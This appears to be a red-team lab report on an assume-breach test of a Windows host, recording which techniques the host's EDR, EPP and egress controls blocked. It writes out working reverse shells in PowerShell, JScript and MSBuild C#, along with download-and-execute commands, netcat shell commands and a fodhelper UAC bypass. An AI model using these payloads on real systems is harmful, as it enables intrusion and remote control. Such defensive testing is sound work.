# Phase 2 — Network Boundary, Local Enumeration & Privilege Escalation Attempts

## 📑 Table of Contents

- [🎯 Objective](#-objective)
- [🏗️ Lab Topology (Phase 2)](#️-lab-topology-phase-2)
- [🔍 Phase 2.1 — Network Segmentation & Egress Filtering Validation](#-phase-21--network-segmentation--egress-filtering-validation)
  - [Test 2.1.1 — Direct Reverse Shell Attempt (PowerShell)](#test-211--direct-reverse-shell-attempt-powershell)
  - [Test 2.1.2 — Direct Reverse Shell Attempt (Netcat)](#test-212--direct-reverse-shell-attempt-netcat)
  - [Test 2.1.3 — ICMP/Ping Connectivity](#test-213--icmpping-connectivity)
- [🌐 Phase 2.2 — DNS & Web Reputation Filtering](#-phase-22--dns--web-reputation-filtering)
  - [Test 2.2.1 — Access Public Tunneling Service](#test-221--access-public-tunneling-service)
- [🔄 Phase 2.3 — URL Rewriting & Deep Link Inspection](#-phase-23--url-rewriting--deep-link-inspection)
  - [Test 2.3.1 — Redirector Bypass Attempt](#test-231--redirector-bypass-attempt)
- [💻 Phase 2.4 — Local Service Enumeration (Ground Truth)](#-phase-24--local-service-enumeration-ground-truth)
  - [Test 2.4.1 — List Listening Ports](#test-241--list-listening-ports)
  - [Test 2.4.2 — Identify Processes by PID](#test-242--identify-processes-by-pid)
  - [Key Findings](#key-findings)
  - [Detailed Service Information](#detailed-service-information)
- [🚀 Phase 2.5 — Establishing an Assumed-Breach Channel (Outbound Tunneling)](#-phase-25--establishing-an-assumed-breach-channel-outbound-tunneling)
  - [Prerequisite: SSH Client on Windows](#prerequisite-ssh-client-on-windows)
  - [Test 2.5.1 — Establish SSH Tunnel](#test-251--establish-ssh-tunnel)
- [🛠️ Phase 2.6 — Analyzing Exposed High-Privilege Services via Tunnel](#️-phase-26--analyzing-exposed-high-privilege-services-via-tunnel)
  - [Phase 2.6.1 — Intel Active Management Technology (AMT) on Port 16992](#phase-261--intel-active-management-technology-amt-on-port-16992)
    - [Test 2.6.1.1 — HTTP Request](#test-2611--http-request)
    - [Test 2.6.1.2 — Follow Redirect](#test-2612--follow-redirect)
    - [Test 2.6.1.3 — Default Credentials Attempt](#test-2613--default-credentials-attempt)
  - [Phase 2.6.2 — SYSTEM-Level Management Service (Port 2701)](#phase-262--system-level-management-service-port-2701)
    - [Test 2.6.2.1 — Netcat Connection](#test-2621--netcat-connection)
    - [Test 2.6.2.2 — Python Script for Interaction](#test-2622--python-script-for-interaction)
    - [Test 2.6.2.3 — Send "START_HANDSHAKE" Back](#test-2623--send-start_handshake-back)
    - [Test 2.6.2.4 — Attempt Common Commands](#test-2624--attempt-common-commands)
- [⚔️ Phase 2.7 — Local Privilege Escalation Attempts (Via Native Shell)](#️-phase-27--local-privilege-escalation-attempts-via-native-shell)
  - [Phase 2.7.1 — Current User & Privileges](#phase-271--current-user--privileges)
  - [Phase 2.7.2 — AlwaysInstallElevated Check](#phase-272--alwaysinstallelevated-check)
  - [Phase 2.7.3 — Unquoted Service Paths](#phase-273--unquoted-service-paths)
  - [Phase 2.7.4 — Writable Service Binaries](#phase-274--writable-service-binaries)
  - [Phase 2.7.5 — Writable System Directories](#phase-275--writable-system-directories)
  - [Phase 2.7.6 — Scheduled Tasks (SYSTEM)](#phase-276--scheduled-tasks-system)
    - [Test 2.7.6.1 — Examine OneDrive Task](#test-2761--examine-onedrive-task)
    - [Test 2.7.6.2 — Check Binary Permissions](#test-2762--check-binary-permissions)
  - [Phase 2.7.7 — UAC Bypass Attempts](#phase-277--uac-bypass-attempts)
    - [Test 2.7.7.1 — fodhelper Bypass](#test-2771--fodhelper-bypass)
  - [Phase 2.7.8 — Domain Group Information](#phase-278--domain-group-information)
- [🧪 Phase 2.8 — Fileless & LotL Execution Attempts](#-phase-28--fileless--lotl-execution-attempts)
  - [Phase 2.8.1 — PowerShell (Standard)](#phase-281--powershell-standard)
  - [Phase 2.8.2 — PowerShell (Base64 Encoded)](#phase-282--powershell-base64-encoded)
  - [Phase 2.8.3 — Netcat Binary Transfer](#phase-283--netcat-binary-transfer)
  - [Phase 2.8.4 — JScript Reverse Shell (Winsock)](#phase-284--jscript-reverse-shell-winsock)
  - [Phase 2.8.5 — Batch File with PowerShell](#phase-285--batch-file-with-powershell)
  - [Phase 2.8.6 — MSBuild (C# In-Memory Compilation)](#phase-286--msbuild-c-in-memory-compilation)
- [🔑 Phase 2.9 — Credential Access Simulation & SMB Signing](#-phase-29--credential-access-simulation--smb-signing)
  - [Test 2.9.1 — Responder Simulation](#test-291--responder-simulation)
  - [Test 2.9.2 — SMB Signing Check](#test-292--smb-signing-check)
- [📦 Phase 2.10 — Alternative File Transfer Methods (Bypassing EPP)](#-phase-210--alternative-file-transfer-methods-bypassing-epp)
  - [Test 2.10.1 — PowerShell Invoke-WebRequest](#test-2101--powershell-invoke-webrequest)
  - [Test 2.10.2 — Bitsadmin](#test-2102--bitsadmin)
  - [Test 2.10.3 — Fileless Download with IEX (PowerShell)](#test-2103--fileless-download-with-iex-powershell)
- [🧱 Phase 2.11 — Writable Directory Exploitation Attempts](#-phase-211--writable-directory-exploitation-attempts)
  - [Test 2.11.1 — Create Test File](#test-2111--create-test-file)
  - [Test 2.11.2 — DLL Hijacking Check](#test-2112--dll-hijacking-check)
  - [Test 2.11.3 — Create and Execute Batch File](#test-2113--create-and-execute-batch-file)
  - [Test 2.11.4 — Create Scheduled Task in Writable Directory](#test-2114--create-scheduled-task-in-writable-directory)
- [🚀 Phase 2.12 — Reverse Tunneling Success](#-phase-212--reverse-tunneling-success)
  - [Test 2.12.1 — SSH Remote Port Forwarding](#test-2121--ssh-remote-port-forwarding)
  - [Test 2.12.2 — Verify Tunnel (From Kali)](#test-2122--verify-tunnel-from-kali)
- [🏁 Phase 2 — Final Summary & Key Findings](#-phase-2--final-summary--key-findings)
- [📌 Defensive Recommendations (Phase 2)](#-defensive-recommendations-phase-2)
  - [Critical Findings Requiring Attention](#critical-findings-requiring-attention)
  - [General Hardening Recommendations](#general-hardening-recommendations)
- [📎 Notes](#-notes)
- [🔗 Back to Main](#-back-to-main)

## 🎯 Objective

Following Phase 1 (which focused on email perimeter and initial delivery), Phase 2 simulates an **assume-breach scenario** where an attacker has already gained a foothold (e.g., via a malicious document or credential theft) and now attempts to:

- Understand network segmentation and egress filtering policies.
- Identify and analyze exposed local services running with elevated privileges.
- Test living-off-the-land (LotL) and fileless techniques to bypass Endpoint Detection & Response (EDR) and Data Loss Prevention (DLP).
- Validate the feasibility of establishing a reverse tunnel under strict egress controls.
- Map the local privilege escalation attack surface using only native Windows tools and commands.

---

## 🏗️ Lab Topology (Phase 2)

To isolate the corporate network's influence and validate findings, the lab was reconfigured into two distinct states:

| State | Network | Components | Purpose |
|-------|---------|------------|---------|
| **State A (Corporate)** | `10.X.X.0/24` | TARGET-PC (Windows 11) with active EDR/EPP/DLP | Test real-world defenses |
| **State B (Isolated)** | `172.20.10.0/24` | TARGET-PC + Kali-Attacker on same subnet | Validate baseline behavior |

A virtualized instance of Kali Linux (`Kali-QEMU`) was running inside `TARGET-PC` using QEMU in default user-mode networking (NAT). This created a layered network environment:

```plaintext
Kali-Attacker (External) <-- Internet/Corp Gateway --> TARGET-PC (Corporate Network) <-- Internal NAT --> Kali-QEMU (10.0.2.15)
```

**IP Addresses (Anonymized):**
- `TARGET-PC` (Corporate): `10.X.X.X`
- `TARGET-PC` (Isolated): `172.20.10.3`
- `Kali-Attacker` (Isolated): `172.20.10.4`
- `Kali-QEMU` (Internal NAT): `10.0.2.15`

---

## 🔍 Phase 2.1 — Network Segmentation & Egress Filtering Validation

Initial attempts to establish a direct command and control (C2) channel from `TARGET-PC` to `Kali-Attacker` were met with consistent failure.

### Test 2.1.1 — Direct Reverse Shell Attempt (PowerShell)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('172.20.10.4',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

| Result | Analysis |
|--------|----------|
| 🔴 **Connection Timeout** | Network-layer segmentation prevented direct routing. Likely strict VLAN/firewall rules. |

### Test 2.1.2 — Direct Reverse Shell Attempt (Netcat)

Attempted to download and execute `nc.exe`:

```cmd
certutil -urlcache -f http://172.20.10.4:8080/nc.exe C:\Windows\CCM\Temp\nc.exe
nc.exe -e cmd.exe 172.20.10.4 4444
```

| Result | Analysis |
|--------|----------|
| 🔴 **File Deleted Immediately** | EPP real-time scanning flagged and quarantined `nc.exe` upon download. |

### Test 2.1.3 — ICMP/Ping Connectivity

```cmd
ping 172.20.10.4
```

| Result | Analysis |
|--------|----------|
| 🔴 **Request Timed Out** | ICMP likely filtered at gateway or host firewall. |

**Conclusion:** Direct inbound/outbound connectivity is heavily restricted by network segmentation and egress filtering.

---

## 🌐 Phase 2.2 — DNS & Web Reputation Filtering

Attempts to connect to known dual-use or tunneling infrastructure were blocked at the application layer.

### Test 2.2.1 — Access Public Tunneling Service

Attempted HTTP request to a well-known tunneling endpoint.

```bash
curl -v http://[tunneling-service].com
```

| Result | Analysis |
|--------|----------|
| 🔴 **Blocked by Web Reputation** | Secure Web Gateway (SWG) or DNS-layer security (e.g., Cisco Umbrella) actively filters destinations based on reputation and category. |

---

## 🔄 Phase 2.3 — URL Rewriting & Deep Link Inspection

Even when using a trusted URL shortener to mask the final destination, the gateway's defenses held firm.

### Test 2.3.1 — Redirector Bypass Attempt

1. Created a short URL pointing to a blocked tunneling service.
2. Attempted to access the short URL from `TARGET-PC`.

| Result | Analysis |
|--------|----------|
| 🔴 **Quarantined / Dropped** | The security stack performed **time-of-click inspection**. The gateway followed the redirection chain, analyzed the final resolved endpoint, and blocked based on destination. |

---

## 💻 Phase 2.4 — Local Service Enumeration (Ground Truth)

To move away from deceptive perimeter signals, a local port scan was performed on `TARGET-PC` using native Windows commands.

### Test 2.4.1 — List Listening Ports

```cmd
netstat -ano | findstr LISTENING
```

### Test 2.4.2 — Identify Processes by PID

```cmd
tasklist | findstr <PID>
```

### Key Findings

| Port | Process Name | Path | Privilege | Analysis |
|------|--------------|------|-----------|----------|
| **135** | `svchost.exe` | `C:\Windows\system32\svchost.exe` | SYSTEM | RPC Endpoint Mapper |
| **445** | `System` | - | SYSTEM | SMB |
| **623** | `LMS.exe` | `C:\Windows\System32\DriverStore\...\LMS.exe` | SYSTEM | Intel Management Engine |
| **2701** | `CmRcService.exe` | `C:\WINDOWS\CCM\RemCtrl\CmRcService.exe` | **SYSTEM** | Configuration Manager Remote Control |
| **5040** | `unknown` | - | - | No response to probes |
| **8005** | `System` | - | SYSTEM | Microsoft HTTPAPI |
| **16992** | `LMS.exe` | `C:\Windows\System32\DriverStore\...\LMS.exe` | SYSTEM | Intel AMT HTTPS |

### Detailed Service Information

```cmd
sc qc CmRcService
```

**Output:**
```
SERVICE_NAME: CmRcService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        BINARY_PATH_NAME   : C:\WINDOWS\CCM\RemCtrl\CmRcService.exe
        SERVICE_START_NAME : LocalSystem
```

**Critical Finding:** A **SYSTEM-level service** (`CmRcService.exe`) listening on `127.0.0.1:2701`. This represents a high-value local attack surface.

---

## 🚀 Phase 2.5 — Establishing an Assumed-Breach Channel (Outbound Tunneling)

Since direct inbound connections were impossible, we simulated an "assume-breach" scenario by creating an outbound tunnel using SSH remote port forwarding.

### Prerequisite: SSH Client on Windows

```cmd
ssh
```

**Result:** SSH client was available on `TARGET-PC`.

### Test 2.5.1 — Establish SSH Tunnel

```cmd
ssh -p 2222 -R 2701:127.0.0.1:2701 -R 16992:127.0.0.1:16992 kali@172.20.10.4
```

| Result | Analysis |
|--------|----------|
| ✅ **Tunnel Established** | SSH remote port forwarding bypassed egress filters by making the connection appear as outbound SSH traffic. Local ports `2701` and `16992` became reachable from attacker via `localhost`. |

**Important:** This tunnel remained open for the duration of the testing. **The success of this step highlights the critical importance of detecting unauthorized outbound tunnels.**

---

## 🛠️ Phase 2.6 — Analyzing Exposed High-Privilege Services via Tunnel

With the tunnel active, local-only SYSTEM services became reachable from `Kali-Attacker` via `localhost`.

### Phase 2.6.1 — Intel Active Management Technology (AMT) on Port 16992

#### Test 2.6.1.1 — HTTP Request

```bash
curl -k http://127.0.0.1:16992
```

**Response:**
```
HTTP/1.1 303 See Other
Location: /logon.htm
Server: Intel(R) Active Management Technology 15.0.55.2751
```

#### Test 2.6.1.2 — Follow Redirect

```bash
curl -k http://127.0.0.1:16992/logon.htm
```

**Response:**
```html
<h2 class=warn>Page Not Found</h2>
<p>Web browser access to Intel&reg; Active Management Technology is disabled on this computer...
```

#### Test 2.6.1.3 — Default Credentials Attempt

```bash
curl -k -u admin:admin https://127.0.0.1:16992
curl -k -u admin:P@ssw0rd https://127.0.0.1:16992
```

| Result | Analysis |
|--------|----------|
| 🔴 **Authentication Required / Rejected** | Web interface explicitly disabled; authentication required for API access. System appears patched and hardened. |

### Phase 2.6.2 — SYSTEM-Level Management Service (Port 2701)

#### Test 2.6.2.1 — Netcat Connection

```bash
nc -nv 127.0.0.1 2701
```

**Response:**
```
(UNKNOWN) [127.0.0.1] 2701 (?) open
START_HANDSHAKE
```

#### Test 2.6.2.2 — Python Script for Interaction

Created `test2701.py`:
```python
import socket

s = socket.socket()
s.connect(('127.0.0.1', 2701))
print("Connected, waiting for server data...")
data = s.recv(1024)
print("Received:", data)
s.close()
```

**Output:**
```
Connected, waiting for server data...
Received: b''
```

#### Test 2.6.2.3 — Send "START_HANDSHAKE" Back

```python
s.send(b"START_HANDSHAKE\r\n")
data = s.recv(1024)
```

**Response:** No data received.

#### Test 2.6.2.4 — Attempt Common Commands

Commands tested: `HELP`, `INFO`, `STATUS`, `VERSION`, `AUTH`

| Result | Analysis |
|--------|----------|
| 🔴 **No Response** | Service uses proprietary protocol requiring valid handshake. Passive probes ineffective. |

**Conclusion:** While the service is a high-value target, its proprietary nature and lack of verbose error messages make it a "black box" without specific protocol knowledge.

---

## ⚔️ Phase 2.7 — Local Privilege Escalation Attempts (Via Native Shell)

With a limited command shell on `TARGET-PC` (as a standard domain user), a comprehensive battery of local privilege escalation checks were performed using only native Windows commands.

### Phase 2.7.1 — Current User & Privileges

```cmd
whoami
```

**Output:** `DOMAIN\testuser`

```cmd
whoami /priv
```

**Output:**
```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeUndockPrivilege             Remove computer from docking   Disabled
SeIncreaseWorkingSetPrivilege Increase process working set   Disabled
SeTimeZonePrivilege           Change the time zone           Disabled
```

**Key Finding:** Required privileges for token impersonation (`SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`) were **not present**.

### Phase 2.7.2 — AlwaysInstallElevated Check

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

| Result | Analysis |
|--------|----------|
| 🔴 **Not Found / Disabled** | GPO prevents non-admin users from installing MSI packages with elevated privileges. |

### Phase 2.7.3 — Unquoted Service Paths

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**Output:** All third-party service paths were properly quoted or located in non-writable system directories.

| Result | Analysis |
|--------|----------|
| 🔴 **Not Exploitable** | No unquoted service paths found. |

### Phase 2.7.4 — Writable Service Binaries

Checked key service directories for write permissions:

```cmd
icacls "C:\Program Files\TeamViewer\TeamViewer_Service.exe"
icacls "C:\Program Files (x86)\Dell\UpdateService\ServiceShell.exe"
icacls "C:\Program Files\GLPI-Agent\perl\bin\glpi-agent.exe"
icacls "C:\Program Files (x86)\Vendor\Security\..."
```

| Result | Analysis |
|--------|----------|
| 🔴 **Read-Only (RX)** | All third-party service binaries had only `(RX)` permissions for users. Binary replacement not possible. |

### Phase 2.7.5 — Writable System Directories

```cmd
icacls "C:\Windows\CCM\Temp"
```

**Output:**
```
C:\Windows\CCM\Temp NT AUTHORITY\INTERACTIVE:(CI)(RX,W)
```

| Result | Analysis |
|--------|----------|
| ✅ **Writable** | User had full write access to `C:\Windows\CCM\Temp`. However, no SYSTEM service directly used this path. |

### Phase 2.7.6 — Scheduled Tasks (SYSTEM)

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -like "*SYSTEM*"} | Select-Object TaskName, TaskPath, State
```

**Output:**
```
TaskName                                    TaskPath                      State
--------                                    --------                      -----
OneDrive Per-Machine Standalone Update Task \                             Ready
Configuration Manager Health Evaluation     \Microsoft\Configuration...   Ready
... (many more)
```

#### Test 2.7.6.1 — Examine OneDrive Task

```powershell
$task = Get-ScheduledTask -TaskName "OneDrive Per-Machine Standalone Update Task"
$task.Actions
```

**Output:**
```
Execute          : C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe
```

#### Test 2.7.6.2 — Check Binary Permissions

```cmd
icacls "C:\Program Files\Microsoft OneDrive\OneDriveStandaloneUpdater.exe"
```

**Output:** `BUILTIN\Users:(RX)` only.

| Result | Analysis |
|--------|----------|
| 🔴 **Not Writable** | Binary is read-only. Task cannot be hijacked. |

### Phase 2.7.7 — UAC Bypass Attempts

#### Test 2.7.7.1 — fodhelper Bypass

```cmd
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /d "" /f
fodhelper.exe
```

| Result | Analysis |
|--------|----------|
| 🔴 **Access Denied / No Effect** | Either EDR prevented registry modification or GPO blocked the technique. |

### Phase 2.7.8 — Domain Group Information

```cmd
whoami /groups
net user %username% /domain
```

**Key Findings:**
- User is member of standard domain groups
- User is member of `Domain Users`
- User is **not** in local Administrators group

---

## 🧪 Phase 2.8 — Fileless & LotL Execution Attempts

With standard privilege escalation paths closed, the focus shifted to executing code without writing malicious binaries to disk.

### Phase 2.8.1 — PowerShell (Standard)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('172.20.10.4',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

| Result | Analysis |
|--------|----------|
| 🔴 **Process Terminated** | EDR behavioral analysis detected and terminated the process. |

### Phase 2.8.2 — PowerShell (Base64 Encoded)

```bash
# On Kali: Encode the script
cat shell.ps1 | iconv -t UTF-16LE | base64 -w 0
```

```powershell
powershell -EncodedCommand <BASE64_STRING>
```

| Result | Analysis |
|--------|----------|
| 🔴 **Process Terminated** | Behavioral analysis not fooled by obfuscation. |

### Phase 2.8.3 — Netcat Binary Transfer

```cmd
certutil -urlcache -f http://172.20.10.4:8080/nc.exe C:\Windows\CCM\Temp\nc.exe
```

| Result | Analysis |
|--------|----------|
| 🔴 **File Deleted Immediately** | EPP real-time scanning flagged and quarantined the executable. |

### Phase 2.8.4 — JScript Reverse Shell (Winsock)

#### Step 1: Create reverse.js on Kali

```javascript
var shell = new ActiveXObject("WScript.Shell");
var socket = new ActiveXObject("MSWinsock.Winsock");

socket.Connect("172.20.10.4", 4444);

while (true) {
    try {
        var command = socket.ReceiveData();
        if (command) {
            var exec = shell.Exec("cmd.exe /c " + command);
            var output = exec.StdOut.ReadAll() + exec.StdErr.ReadAll();
            socket.SendData(output + "\r\n> ");
        }
        WScript.Sleep(100);
    } catch (e) {}
}
```

#### Step 2: Download and Execute

```cmd
certutil -urlcache -f http://172.20.10.4:8080/reverse.js C:\Windows\CCM\Temp\reverse.js
cscript C:\Windows\CCM\Temp\reverse.js
```

| Result | Analysis |
|--------|----------|
| 🔴 **File Deleted Immediately** | Heuristic content scanning identified malicious script patterns. |

### Phase 2.8.5 — Batch File with PowerShell

```cmd
echo powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& { Add-Type -AssemblyName System.Net.Sockets; $c=New-Object Net.Sockets.TCPClient('127.0.0.1',4444); $s=$c.GetStream(); [byte[]]$b=0..255|%{0}; while(($i=$s.Read($b,0,$b.Length)) -ne 0){ $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i); $r=(iex $d 2>&1 | Out-String ); $r2=$r+'PS '+(pwd).Path+'> '; $s.Write(([text.encoding]::ASCII).GetBytes($r2),0,$r2.Length); $s.Flush() }; $c.Close() }" > %TEMP%\reverse.bat
%TEMP%\reverse.bat
```

| Result | Analysis |
|--------|----------|
| 🔴 **Process Terminated** | EDR detected and terminated the PowerShell process. |

### Phase 2.8.6 — MSBuild (C# In-Memory Compilation)

MSBuild is a signed Microsoft binary that can compile and execute C# code without writing an EXE to disk.

#### Step 1: Create shell.xml on Kali

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <UsingTask TaskName="ReverseShell" TaskFactory="CodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        <![CDATA[
          using System;
          using System.Net.Sockets;
          using System.Diagnostics;
          using System.IO;
          
          public class ReverseShell
          {
              public void Execute()
              {
                  try
                  {
                      TcpClient client = new TcpClient("172.20.10.4", 4444);
                      NetworkStream stream = client.GetStream();
                      StreamReader reader = new StreamReader(stream);
                      StreamWriter writer = new StreamWriter(stream);
                      writer.AutoFlush = true;

                      string line;
                      while ((line = reader.ReadLine()) != null)
                      {
                          Process p = new Process();
                          p.StartInfo.FileName = "cmd.exe";
                          p.StartInfo.Arguments = "/c " + line;
                          p.StartInfo.UseShellExecute = false;
                          p.StartInfo.RedirectStandardOutput = true;
                          p.StartInfo.RedirectStandardError = true;
                          p.StartInfo.CreateNoWindow = true;
                          p.Start();
                          string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                          writer.WriteLine(output);
                          writer.Flush();
                      }
                  }
                  catch (Exception) { }
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
  <Target Name="Shell">
    <ReverseShell />
  </Target>
</Project>
```

#### Step 2: Download and Execute

```cmd
certutil -urlcache -f http://172.20.10.4:8080/shell.xml C:\Windows\CCM\Temp\shell.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\CCM\Temp\shell.xml
```

**Attempt 1 Output:**
```
error MSB4067: The <Task> element beneath the <UsingTask> element is unrecognized.
```

**Analysis:** This was a **structural/environment error**, not a security block. The `CodeTaskFactory` could not be loaded, likely due to environment path issues or missing dependencies.

**Attempt 2 (Corrected XML):**
```
C:\Windows\CCM\Temp\shell.xml(51,5): error CS1513: } expected
C:\Windows\CCM\Temp\shell.xml(51,5): error CS0542: 'ReverseShell': member names cannot be the same as their enclosing type
```

**Analysis:** C# compilation errors. The code did not properly implement the required Task interface.

**Attempt 3 (Final Version with proper Task inheritance):**

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Shell">
    <UsingTask
      TaskName="ShellTask"
      TaskFactory="CodeTaskFactory"
      AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
      <Task>
        <Code Type="Class" Language="cs">
          <![CDATA[
            using System;
            using System.Net.Sockets;
            using System.Diagnostics;
            using System.IO;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class ShellTask : Task
            {
                public override bool Execute()
                {
                    try
                    {
                        TcpClient client = new TcpClient("172.20.10.4", 4444);
                        NetworkStream stream = client.GetStream();
                        StreamReader reader = new StreamReader(stream);
                        StreamWriter writer = new StreamWriter(stream);
                        writer.AutoFlush = true;

                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            Process p = new Process();
                            p.StartInfo.FileName = "cmd.exe";
                            p.StartInfo.Arguments = "/c " + line;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.StartInfo.CreateNoWindow = true;
                            p.Start();
                            string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                            writer.WriteLine(output);
                            writer.Flush();
                        }
                    }
                    catch (Exception) { }
                    return true;
                }
            }
          ]]>
        </Code>
      </Task>
    </UsingTask>
    <ShellTask />
  </Target>
</Project>
```

| Result | Analysis |
|--------|----------|
| 🟡 **MSBuild executed, but shell failed** | Even with corrected syntax, the compilation failed. **Hypothetical next step:** Even if compiled successfully, AMSI would have scanned the .NET assembly and terminated the process at runtime. |

---

## 🔑 Phase 2.9 — Credential Access Simulation & SMB Signing

### Test 2.9.1 — Responder Simulation

Attempted to simulate LLMNR/NetBIOS poisoning using Responder on Kali-QEMU.

```bash
sudo responder -I eth0 -wrf
```

| Result | Analysis |
|--------|----------|
| 🔴 **No Hashes Captured** | Likely GPO disabled these protocols. Network segmentation also prevented broadcast traffic from reaching Kali-QEMU. |

### Test 2.9.2 — SMB Signing Check

```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature
```

**Output:** `RequireSecuritySignature : True`

| Result | Analysis |
|--------|----------|
| 🟢 **SMB Signing Required** | This prevents classic SMB relay attacks, even if NTLM hashes are captured. |

---

## 📦 Phase 2.10 — Alternative File Transfer Methods (Bypassing EPP)

Since `certutil` downloads were immediately scanned and deleted, alternative transfer methods were tested.

### Test 2.10.1 — PowerShell Invoke-WebRequest

```powershell
Invoke-WebRequest -Uri http://172.20.10.4:8080/reverse.ps1 -OutFile C:\Windows\CCM\Temp\reverse.ps1
```

| Result | Analysis |
|--------|----------|
| 🔴 **Blocked** | PowerShell execution restricted. |

### Test 2.10.2 — Bitsadmin

```cmd
bitsadmin /transfer myjob /download /priority high http://172.20.10.4:8080/reverse.js C:\Windows\CCM\Temp\reverse.js
```

| Result | Analysis |
|--------|----------|
| 🔴 **Terminated** | Bitsadmin process was terminated by EDR. |

### Test 2.10.3 — Fileless Download with IEX (PowerShell)

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://172.20.10.4:8080/PowerView.ps1')
```

| Result | Analysis |
|--------|----------|
| 🔴 **Blocked** | PowerShell execution restricted. |

---

## 🧱 Phase 2.11 — Writable Directory Exploitation Attempts

`C:\Windows\CCM\Temp` was identified as writable. Attempts were made to leverage this for privilege escalation.

### Test 2.11.1 — Create Test File

```cmd
echo test > C:\Windows\CCM\Temp\test.txt
```

| Result | Analysis |
|--------|----------|
| ✅ **File Created** | Write access confirmed. |

### Test 2.11.2 — DLL Hijacking Check

Checked if any SYSTEM service loads DLLs from writable paths.

```cmd
dir C:\Windows\CCM\RemCtrl\*.dll
```

**Output:** Several DLLs present, but directory permissions were read-only.

```cmd
icacls "C:\Windows\CCM\RemCtrl\*.dll"
```

**Output:** All DLLs had `(RX)` permissions only.

| Result | Analysis |
|--------|----------|
| 🔴 **No Writable DLLs** | DLL hijacking not possible. |

### Test 2.11.3 — Create and Execute Batch File

```cmd
echo whoami > C:\Windows\CCM\Temp\test.bat
C:\Windows\CCM\Temp\test.bat
```

**Output:** `DOMAIN\testuser`

| Result | Analysis |
|--------|----------|
| ✅ **Command Executed** | Batch files can be created and executed, but only with user privileges. |

### Test 2.11.4 — Create Scheduled Task in Writable Directory

Attempted to create a task that runs a script from the writable directory:

```cmd
schtasks /create /tn "TestTask" /tr "C:\Windows\CCM\Temp\test.bat" /sc once /st 00:01 /f
schtasks /run /tn "TestTask"
```

| Result | Analysis |
|--------|----------|
| ✅ **Task Created and Run** | Task executed with user privileges, not SYSTEM. No privilege escalation. |

---

## 🚀 Phase 2.12 — Reverse Tunneling Success

After multiple failed attempts, the SSH remote port forwarding method succeeded.

### Test 2.12.1 — SSH Remote Port Forwarding

```cmd
ssh -p 2222 -R 2701:127.0.0.1:2701 -R 16992:127.0.0.1:16992 kali@172.20.10.4
```

| Result | Analysis |
|--------|----------|
| ✅ **Tunnel Established** | Local ports `2701` and `16992` became accessible from attacker via `localhost`. |

### Test 2.12.2 — Verify Tunnel (From Kali)

```bash
nc -nv 127.0.0.1 2701
```

**Output:** `START_HANDSHAKE` message received.

```bash
curl -k http://127.0.0.1:16992
```

**Output:** AMT redirect received.

**Conclusion:** The tunnel successfully exposed internal services that were previously unreachable.

---

## 🏁 Phase 2 — Final Summary & Key Findings

| Attack Stage | Attempts | Result | Primary Controls |
|--------------|----------|--------|------------------|
| **Direct C2 Establishment** | PowerShell reverse shell, Netcat | 🔴 Blocked | Network Segmentation, Egress Filtering |
| **File Download** | certutil, bitsadmin, PowerShell | 🔴 Blocked | EPP Real-time Scanning |
| **File Execution** | .exe, .bat, .ps1, .js | 🔴 Blocked | EPP + EDR + AMSI |
| **MSBuild Execution** | C# in-memory compilation | 🟡 Partial (failed) | Environment constraints + AMSI (hypothetical) |
| **Local Service Enumeration** | netstat, tasklist | ✅ Successful | N/A (Information Disclosure) |
| **High-Privilege Service Discovery** | CmRcService (SYSTEM) on port 2701 | ✅ Identified | N/A |
| **AMT Exposure** | Ports 623, 16992 | ✅ Identified | N/A |
